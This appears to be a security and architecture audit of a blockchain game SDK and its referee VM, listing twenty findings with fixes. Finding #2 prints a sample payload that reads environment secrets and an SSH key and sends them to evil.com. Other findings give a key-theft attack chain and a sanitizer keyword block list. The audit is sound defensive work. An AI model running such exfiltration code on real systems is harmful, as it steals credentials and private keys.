# falken-logic-sdk + FalkenVM — V4 Security & Architecture Audit

## What's Good (Keep As-Is)

- `init() → processMove() → checkResult()` pure functional model is correct
- LCG (Linear Congruential Generator) for deterministic randomness is the right approach
- Banning `Math.random`, `Date.now`, `fetch`, `eval` via CLI sanitizer is correct
- Generic `TState` gives developers full flexibility
- Minimal dependency surface (just Zod)
- esbuild bundling before IPFS upload is correct
- Pinata integration for IPFS pinning is correct
- IPFS gateway failover in Fetcher is correct
- Watcher reads chain state before processing (source-of-truth principle)

---

## CRITICAL — Breaks Settlement / Security

---

### 1. `normalizeResult()` awards the pot to the wrong player

**File:** `packages/falken-vm/src/Referee.ts:104-132`

```typescript
// For 2 players (playerCount=2):
// PLAYER_A_WINS (1): 1>=1 && 1<=2 && 1>1 → FALSE → returns 1 (player B index!)
// PLAYER_B_WINS (2): 2>=1 && 2<=2 && 2>1 → TRUE  → returns 2-1=1 (player B — accidentally correct)
if (result >= 1 && result <= playerCount && result > playerCount - 1) {
  return result - 1;
}
return result;
```

When a game returns `GameResult.PLAYER_A_WINS` (value=1), the Referee submits winner
index 1 on-chain — which is **player B**. Player A wins but player B collects the pot.
Silent, no error thrown.

**Fix:** Replace with:
```typescript
if (result >= 1 && result <= playerCount) return result - 1; // Always convert 1-indexed to 0-indexed
```
Then migrate all games to use 0-indexed `FalkenResult` (see #7).

---

### 2. `new Function()` is not a sandbox — arbitrary code execution

**File:** `packages/falken-vm/src/Referee.ts:40-68`

```typescript
const runLogic = new Function('context', 'moves', `
  ${transformedCode}  // ← arbitrary JS from IPFS runs here
`);
```

This runs in the **same Node.js process** as the Referee. A malicious game developer can:

```javascript
// In their IPFS-uploaded "game logic":
const keys = process.env;  // REFEREE_PRIVATE_KEY, SUPABASE_SERVICE_ROLE_KEY
require('child_process').execSync(`curl -d '${JSON.stringify(keys)}' https://evil.com`);
require('fs').readFileSync('/home/user/.ssh/id_rsa');
```

`isolated-vm` is listed as `external` in the esbuild config — planned but never wired up.

**Fix:** Replace `new Function()` with isolated-vm or quickjs-emscripten:
```typescript
import ivm from 'isolated-vm';
const isolate = new ivm.Isolate({ memoryLimit: 32 });
const ctx = await isolate.createContext();
// No access to process, require, fs, etc.
await ctx.eval(transformedCode, { timeout: 5000 });
```

---

### 3. Entire VM pipeline is V3-only — ALL components need V4 ABIs

Not just the Settler — the Watcher, LogicRegistry ABI, and event decoding are all V3.

**Watcher ABI mismatches** (`packages/falken-vm/src/Watcher.ts`):

| Component | V3 (current) | V4 (needed) |
|---|---|---|
| `MoveRevealed.move` | `uint8` | `bytes32` |
| `getMatch` output struct | Has `phase`, `commitDeadline`, `revealDeadline` in struct | Phase/deadlines are NOT in `BaseMatch` — they're in `getPokerState()` |
| LogicRegistry `registry()` output | 5 fields: `ipfsCid, developer, isVerified, createdAt, totalVolume` | 8 fields: adds `isActive, bettingEnabled, maxStreets` |
| Phase check | `phase === 1` (REVEAL in V3 FiseEscrow) | PokerEngine: `phase === 2` (REVEAL), FiseEscrowV4: `phase === 1` |
| Event listener | `MoveRevealed` only | Also needs: `PlayerFolded`, `StreetAdvanced`, `BetPlaced` |

**Settler ABI mismatch** (`packages/falken-vm/src/Settler.ts`):

| V3 | V4 |
|---|---|
| `resolveFiseRound(matchId, uint8)` | `resolveRound(matchId, uint8)` — PokerEngine |
| Single winner only | `resolveRoundSplit(matchId, Resolution)` — for split pots |
| No street concept | `advanceStreet(matchId)` — for intermediate streets |

The Settler also doesn't know which contract type it's talking to. V4 needs:
- PokerEngine: `resolveRound` / `advanceStreet` / `resolveRoundSplit`
- FiseEscrowV4: `resolveFiseRound` (same as V3 but different address)

**Fix:** Refactor Watcher and Settler to be contract-type-aware:
```typescript
// Watcher must support multiple escrow types
interface EscrowConfig {
  address: `0x${string}`;
  type: 'poker' | 'fise' | 'turnbased';
  abi: readonly any[];
}

// Settler must support Resolution struct
async resolveRound(config: EscrowConfig, matchId: bigint, resolution: Resolution)
```

---

### 4. Deck seed uses `matchId + round` with NO salt — pre-computable

**Files:** All V3 bots (`llm-house-bot`, `llm-house-bot-david`, `reference-agent`, `mcp-server`)

```typescript
// EVERY V3 bot:
const seedStr = matchId + "_" + round;
```

`matchId` is sequential (`matchCounter++`). Any player can pre-compute the deck for the
next match before it's created. They know the exact cards they'll receive and can
reverse-engineer the optimal discard before committing.

Per V4 spec, the seed must be:
```
keccak256(saltA + saltB + ... + matchId + round)
```

Using BOTH player salts AFTER both have committed — so the deck is unknowable until reveal.
No component currently implements this.

**Additional inconsistency — 3 different seed schemes exist:**

| Component | Seed |
|---|---|
| V2 `house-bot/HouseBot.ts` | `address.toLowerCase() + salt + round` |
| V3 `llm-house-bot`, `reference-agent` | `matchId + "_" + round` |
| V2 `house-bot/LiarsDiceBot.ts` | `address.toLowerCase() + salt.toLowerCase()` |

If the game logic uses one scheme and the bot uses another, they compute different decks
and the bot makes decisions based on a hand it doesn't actually have.

**Fix:** Centralize seed derivation in the SDK:
```typescript
function createDualSaltSeed(salts: string[], matchId: string, round: number): number
```
All bots and all game logic must use this function.

---

### 5. Fetcher has no content hash verification

**File:** `packages/falken-vm/src/Fetcher.ts`

```typescript
const response = await fetch(url, { signal: AbortSignal.timeout(5000) });
const code = await response.text();  // ← blindly trusts the gateway
return code;
```

IPFS CIDs are content-addressed — the hash of the content IS the address. But the Fetcher
never verifies the hash of the downloaded content. If an IPFS gateway is compromised, it
could serve arbitrary JS that gets executed by the Referee (which has no sandbox — #2).

**Attack chain:**
1. Attacker compromises Pinata/Cloudflare IPFS gateway (or performs CDN cache poisoning)
2. Gateway returns malicious JS for a popular game CID
3. Fetcher downloads malicious code, passes to Referee
4. Referee executes via `new Function()` — `process.env.REFEREE_PRIVATE_KEY` exfiltrated
5. Attacker signs settlement transactions with the stolen key

**Fix:** Verify content hash after download:
```typescript
import { sha256 } from '@noble/hashes/sha256';
const code = await response.text();
const actualHash = sha256(new TextEncoder().encode(code));
// Verify matches CID (CIDv0 = base58 of sha256)
```

---

### 6. Fetcher has no content size limit — OOM denial of service

**File:** `packages/falken-vm/src/Fetcher.ts`

```typescript
const code = await response.text();  // No size limit
```

A malicious IPFS CID registered in LogicRegistry could return gigabytes of data. The
Fetcher downloads the entire response into memory. Combined with the `new Function()`
issue (#2), this is an OOM crash vector.

**Fix:** Stream with size limit:
```typescript
const MAX_LOGIC_SIZE = 1024 * 1024; // 1MB — generous for game logic
const code = await response.text();
if (code.length > MAX_LOGIC_SIZE) throw new Error('Logic exceeds size limit');
```

---

## HIGH — Breaks Scaling

---

### 7. `GameResult` enum is hardcoded 2-player

**File:** `packages/falken-logic-sdk/src/index.ts:8-13`

```typescript
enum GameResult { PENDING = 0, PLAYER_A_WINS = 1, PLAYER_B_WINS = 2, DRAW = 255 }
```

Can't express 6-player poker, split pots, or multi-winner scenarios.

**Fix:** Replace with:
```typescript
interface FalkenResult {
  status: 'pending' | 'complete';
  winnerIndices: number[];   // 0-indexed: [] = pending, [2] = player 2, [0,2] = split
  splitBps?: number[];       // must sum to 10000 when present
  description?: string;      // human-readable (merge describeState into result)
}
```

---

### 8. Example `rps.ts` references fields that don't exist

**File:** `packages/falken-logic-sdk/examples/rps.ts:19-20`

```typescript
playerA: ctx.playerA,  // ← undefined. MatchContext has players[], not playerA/playerB
playerB: ctx.playerB,  // ← undefined.
```

This is the reference implementation third-party developers will copy. It silently
produces `undefined` addresses and all moves route to `else` (player B).

**Fix:** `ctx.players[0]` and `ctx.players[1]`.

---

### 9. No test utilities — developers can't test their games

The SDK has `vitest` as a devDependency but exports zero test helpers. A developer
building `baseball.js` has no way to mock moves and verify results without the full VM.

**Fix:** Export from `@falken/logic-sdk/testing`:
```typescript
function simulate(game: FalkenGame, ctx: MatchContext, moves: GameMove[]): FalkenResult
function createMockContext(overrides?: Partial<MatchContext>): MatchContext
function createMockMove(overrides?: Partial<GameMove>): GameMove
```

---

### 10. Watcher only supports one escrow contract

**File:** `packages/falken-vm/src/index.ts:14-25`

```typescript
const ESCROW_ADDRESS = process.env.FISE_ESCROW_ADDRESS;
await watcher.start(ESCROW_ADDRESS, REGISTRY_ADDRESS);
```

V4 has multiple escrow contracts (PokerEngine, FiseEscrowV4, future TurnBasedEscrow).
The Watcher takes a single address. V4 needs either multiple Watcher instances or
multi-contract support.

**Fix:** Accept array of escrow configs:
```typescript
const escrows: EscrowConfig[] = [
  { address: POKER_ADDRESS, type: 'poker', abi: POKER_ABI },
  { address: FISE_ADDRESS, type: 'fise', abi: FISE_ABI },
];
await watcher.start(escrows, REGISTRY_ADDRESS);
```

---

### 11. Reconstructor reads from DB instead of chain

**File:** `packages/falken-vm/src/Reconstructor.ts`

The Watcher verifies on-chain that all players revealed, then asks the Reconstructor to
pull the actual moves from Supabase. But the indexer lags behind the chain. The
`getSyncedMoves()` retries 10 times (20 seconds total) — but if the indexer is down,
matches never resolve.

The V4 design principle: **"USE THE CHAIN AS SOURCE OF TRUTH, NOT THE DB."**

Moves (bytes32) are available on-chain in `MoveRevealed` events. The Reconstructor should
read directly from chain events, with Supabase as cache/optimization.

**Fix:** Add chain-based move reconstruction:
```typescript
async getMovesFromChain(escrowAddress, matchId, round): Promise<GameMove[]> {
  const logs = await client.getLogs({
    address: escrowAddress,
    event: MoveRevealedEvent,
    args: { matchId },
  });
  return logs.filter(l => l.args.round === round).map(l => ({ ... }));
}
```

---

## MEDIUM — Security / Correctness

---

### 12. Sanitizer doesn't block Node.js globals

**File:** `packages/falken-cli/src/utils/sanitizer.ts`

Banned list catches `Math.random`, `fetch`, `eval` but misses:

```
process.env    → access private keys
require(       → import fs, child_process
__dirname      → filesystem paths
Buffer         → binary manipulation
global         → all Node globals
globalThis     → same
```

Even after fixing the sandbox (#2), the sanitizer should flag these as defense-in-depth:

```typescript
private bannedKeywords = [
  // ... existing
  'process', 'require(', '__dirname', '__filename',
  'Buffer', 'global.', 'globalThis',
];
```

---

### 13. Fake CID registered on-chain in dev mode

**File:** `packages/falken-cli/src/commands/deploy.ts:56-61`

```typescript
// When Pinata keys are missing:
cid = 'sim_' + Math.random().toString(36).substring(7);
// Then this fake CID is submitted to review queue — will never resolve on IPFS
```

**Fix:** Throw a hard error. Never proceed without real IPFS.

---

### 14. `settledRounds` is in-memory only — double settlement on restart

**File:** `packages/falken-vm/src/Watcher.ts:81`

```typescript
private settledRounds = new Set<string>();
```

If the Watcher restarts, the set is cleared. `scanActiveMatches` will re-process
already-settled matches, wasting gas on reverted transactions.

Also: `setTimeout(() => this.settledRounds.delete(roundKey), 60_000)` clears entries after
60s. If the chain is slow, the Watcher could attempt double-settlement.

**Fix:** Persist settled rounds (Redis, SQLite, or just a JSON file).

---

### 15. No retry/queue for failed settlement transactions

**File:** `packages/falken-vm/src/Watcher.ts:242-244`

```typescript
} catch (err: any) {
  this.settledRounds.delete(`${onChainMatchId}-${currentRoundNum}`);
  // ← match is now stuck. No retry, no queue, no alert.
}
```

If settlement fails (nonce collision, gas spike, network error), the roundKey is deleted
from `settledRounds`. But no new `MoveRevealed` event will fire for this round, so the
Watcher will never re-try. The match is stuck until manual intervention.

**Fix:** Add a retry queue:
```typescript
private retryQueue: Map<string, { matchId: bigint, attempts: number, nextRetry: number }>;
```

---

### 16. Watcher only scans last 20 matches on startup

**File:** `packages/falken-vm/src/Watcher.ts:116`

```typescript
const start = Math.max(1, matchCount - 20);
```

If more than 20 matches are pending on restart, older ones are silently dropped.

**Fix:** Scan from last known processed match (persisted), or scan all ACTIVE matches.

---

## LOW — Developer Experience

---

### 17. No street awareness on `MatchContext` / `GameMove`

ArenaEngine (PokerEngine) runs multiple COMMIT→BET→REVEAL per round. The SDK has no
concept of streets.

**Fix:** Add optional `street` and `maxStreets` fields.

---

### 18. `moveData` type doesn't align with V4 contracts

```typescript
moveData: number | string | Record<string, any>
// Should be:
moveData: `0x${string}`  // bytes32 hex, matching V4 contracts
```

**Fix:** Standardize + provide encode/decode helpers.

---

### 19. Wrong royalty percentage in `deploy.ts` console output

```typescript
console.log('receive your 2% game royalties');  // Should be 2.5%
```

---

### 20. `deploy.ts` uses `SUPABASE_ANON_KEY` for submission

If Supabase RLS policies are misconfigured, anyone can submit to the review queue with
any `developer_address`. Should use a service-role key or authenticated endpoint.

---

## Summary — Full Priority List

| # | Issue | Severity | Component |
|---|---|---|---|
| 1 | `normalizeResult()` awards pot to wrong player | CRITICAL | Referee |
| 2 | `new Function()` — no real sandbox, arbitrary code execution | CRITICAL | Referee |
| 3 | Entire VM pipeline (Watcher+Settler) uses V3 ABIs | CRITICAL | Watcher, Settler |
| 4 | Deck seed is pre-computable (no salt dependency) | CRITICAL | SDK, bots, game logic |
| 5 | Fetcher trusts IPFS gateways — no content hash verification | CRITICAL | Fetcher |
| 6 | Fetcher has no size limit — OOM denial of service | CRITICAL | Fetcher |
| 7 | `GameResult` enum — 2-player only, no split pots | HIGH | SDK |
| 8 | Example references `ctx.playerA/B` — doesn't exist | HIGH | SDK examples |
| 9 | No test utilities for game developers | HIGH | SDK |
| 10 | Watcher only supports one escrow contract | HIGH | Watcher |
| 11 | Reconstructor reads from DB instead of chain | HIGH | Reconstructor |
| 12 | Sanitizer misses Node.js globals | MEDIUM | CLI |
| 13 | Fake CID registered on-chain in dev mode | MEDIUM | CLI |
| 14 | `settledRounds` in-memory only — double settlement on restart | MEDIUM | Watcher |
| 15 | No retry/queue for failed settlements | MEDIUM | Watcher |
| 16 | Watcher only scans last 20 matches on restart | MEDIUM | Watcher |
| 17 | No street awareness in SDK types | LOW | SDK |
| 18 | `moveData` type misaligned with bytes32 | LOW | SDK |
| 19 | Wrong royalty % in console output | LOW | CLI |
| 20 | `deploy.ts` uses anon key for submission | LOW | CLI |

---

## Files Requiring Changes

| File | Changes Needed |
|---|---|
| `packages/falken-logic-sdk/src/index.ts` | `FalkenResult` interface, `moveData` type, street fields, dual-salt seed helper, test utilities |
| `packages/falken-logic-sdk/examples/rps.ts` | Fix `ctx.playerA/B` → `ctx.players[0/1]`, update to `FalkenResult` |
| `packages/falken-vm/src/Referee.ts` | Fix `normalizeResult()`, replace `new Function()` with `isolated-vm` |
| `packages/falken-vm/src/Settler.ts` | V4 ABI, multi-contract, `Resolution` struct, retry mechanism |
| `packages/falken-vm/src/Watcher.ts` | V4 ABI, multi-contract, persisted `settledRounds`, retry queue, scan-all on startup |
| `packages/falken-vm/src/Reconstructor.ts` | Chain-based move reconstruction (fallback from Supabase) |
| `packages/falken-vm/src/Fetcher.ts` | Content hash verification, size limit |
| `packages/falken-vm/src/index.ts` | Multi-escrow config |
| `packages/falken-cli/src/utils/sanitizer.ts` | Add Node.js globals to banned list |
| `packages/falken-cli/src/commands/deploy.ts` | Throw on missing Pinata keys, fix royalty % |

---

## Attack Surface Summary

```
                    IPFS Gateway
                         │
                    ┌────▼────┐
                    │ Fetcher │ ← no hash verify, no size limit
                    └────┬────┘
                         │ JS code (untrusted)
                    ┌────▼────┐
                    │ Referee │ ← new Function() = no sandbox
                    │         │   normalizeResult() = wrong winner
                    └────┬────┘
                         │ winner index
                    ┌────▼────┐
                    │ Settler │ ← V3 ABI, no split pots
                    └────┬────┘
                         │ tx
                    ┌────▼────┐
                    │  Chain  │ ← wrong player gets the pot
                    └─────────┘
```

The most dangerous chain: compromised IPFS gateway → malicious JS → no sandbox →
`process.env.REFEREE_PRIVATE_KEY` stolen → attacker settles all future matches in their
favor.

---

*Full audit — falken-sdk-v4updates.md — 2026-03-12*
